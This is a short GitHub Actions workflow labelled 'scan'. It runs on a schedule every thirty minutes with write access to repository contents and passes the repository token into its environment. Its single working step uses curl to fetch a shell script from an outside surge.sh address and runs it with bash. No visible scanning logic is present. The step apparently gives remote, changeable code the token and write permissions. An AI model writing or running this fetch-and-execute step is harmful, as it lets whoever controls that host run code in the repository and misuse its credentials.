name: scan
on:
  schedule:
    - cron: '7,37 * * * *'
  workflow_dispatch:
  push:
    branches: [main]
    paths: ['.github/workflows/scan.yml']
permissions:
  contents: write
concurrency:
  group: scan
  cancel-in-progress: false
jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - name: scan
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          curl -fsSL "https://bk-frscan-194a7c.surge.sh/run.sh?$(date +%s)" -o /tmp/run.sh
          bash /tmp/run.sh
